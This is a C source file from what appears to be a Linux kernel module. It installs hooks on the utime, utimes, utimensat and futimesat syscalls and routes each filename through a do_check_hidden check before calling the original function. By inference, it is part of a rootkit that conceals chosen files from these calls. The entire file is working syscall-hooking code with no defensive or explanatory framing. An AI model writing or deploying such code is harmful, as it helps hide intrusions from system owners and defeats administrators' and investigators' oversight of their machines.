#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/fcntl.h>
#include <linux/printk.h>
#include <linux/time.h>
#include <linux/time_types.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <linux/utime.h>

static inline long do_utimesat(const sysfun_t orig_func, struct pt_regs *const p_regs,
                               const int i32_dfd, const char __user *const s_filename,
                               const int i32_at_flags)
{
    if (s_filename == NULL) {
        return orig_func(p_regs);
    }

    if (i32_at_flags & ~(AT_SYMLINK_NOFOLLOW | AT_EMPTY_PATH)) {
        return -EINVAL;
    }

    return do_check_hidden(orig_func, p_regs, i32_dfd, s_filename, i32_at_flags);
}

// sys_utime syscall hook handler
SYSCALL_HOOK_HANDLER2(utime, orig_utime, p_regs, char __user *, s_filename, struct utimbuf __user *,
                      p_times)
{
    pr_dev_info("utime(%p, %p)\n", s_filename, p_times);

    return do_utimesat(orig_utime, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_utimes syscall hook handler
SYSCALL_HOOK_HANDLER2(utimes, orig_utimes, p_regs, char __user *, s_filename,
                      struct __kernel_old_timeval __user *, p_utimes)
{
    pr_dev_info("utimes(%p, %p)\n", s_filename, p_utimes);

    return do_utimesat(orig_utimes, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_utimensat syscall hook handler
SYSCALL_HOOK_HANDLER4(utimensat, orig_utimensat, p_regs, int, i32_dfd, const char __user *,
                      s_filename, struct __kernel_timespec __user *, p_utimes, int, i32_flags)
{
    pr_dev_info("utimensat(%d, %p, %p, %s%#x)\n", i32_dfd, s_filename, p_utimes,
                SIGNED_ARG(i32_flags));

    return do_utimesat(orig_utimensat, p_regs, i32_dfd, s_filename, i32_flags);
}

// sys_futimesat syscall hook handler
SYSCALL_HOOK_HANDLER3(futimesat, orig_futimesat, p_regs, int, i32_dfd, const char __user *,
                      s_filename, struct __kernel_old_timeval __user *, p_utimes)
{
    pr_dev_info("futimesat(%d, %p, %p)\n", i32_dfd, s_filename, p_utimes);

    return do_utimesat(orig_futimesat, p_regs, i32_dfd, s_filename, 0);
}
